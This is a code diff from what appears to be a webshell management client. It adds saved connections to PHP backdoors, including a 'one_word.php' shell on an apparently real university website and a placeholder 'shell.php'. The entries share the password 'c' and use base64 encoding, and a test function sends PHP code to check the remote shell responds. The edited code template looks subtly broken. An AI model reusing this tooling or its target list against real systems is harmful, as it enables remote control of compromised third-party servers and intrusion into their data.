@@ -235,14 +235,30 @@
                     'pwd': 'c',
                     'type': 'PHP',
                     requestType: this.CONST.REQUEST_TYPE.GET,//0:get,1:post,2:request,
-                    encodeType: this.CONST.ENCODE_TYPE.NONE,
-                    decodeType: this.CONST.DECODE_TYPE.NONE.VALUE,
+                    // encodeType: this.CONST.ENCODE_TYPE.NONE,
+                    // decodeType: this.CONST.DECODE_TYPE.NONE.VALUE,
+                    encodeType: this.CONST.ENCODE_TYPE.BASE64,
+                    decodeType: this.CONST.DECODE_TYPE.BASE64.VALUE,
                 }, {
-                    'id': 'zg9tejzsmskivwgcju',
+                    'id': 'zg9tejzsmskivwgcju2',
                     'ip': '',
                     'createDate': 1608394325898,
                     'changeDate': 1608394325898,
                     'url': 'http://ccn.ee.nsysu.edu.tw//file/one_word.php',
+                    'note': '',
+                    'headers': [],
+                    'addHeader': {'checked': true, 'key': '', 'value': ''},
+                    'pwd': 'c',
+                    'type': 'PHP',
+                    requestType: this.CONST.REQUEST_TYPE.POST,//0:get,1:post,2:request,
+                    encodeType: this.CONST.ENCODE_TYPE.BASE64,
+                    decodeType: this.CONST.DECODE_TYPE.BASE64.VALUE,
+                },{
+                    'id': 'zg9tejzsmskivwgcju1',
+                    'ip': '',
+                    'createDate': 1608394325898,
+                    'changeDate': 1608394325898,
+                    'url': 'http://www.testblog.abc/shell.php',
                     'note': '',
                     'headers': [],
                     'addHeader': {'checked': true, 'key': '', 'value': ''},
@@ -298,7 +314,7 @@
             },
             async test() {
                 let random = this.$random()
-                let phpCode = (a) => `$encode = ${a}  $encode('${random}');`
+                let phpCode = (a) => `${a} encode('${random}');`
                 let res = await this.$genRequest(this.form, phpCode)
                 // let res = await this.$request(this.form.url ,{c:'echo 1111;'},{},'post')
                 if (res === random) {
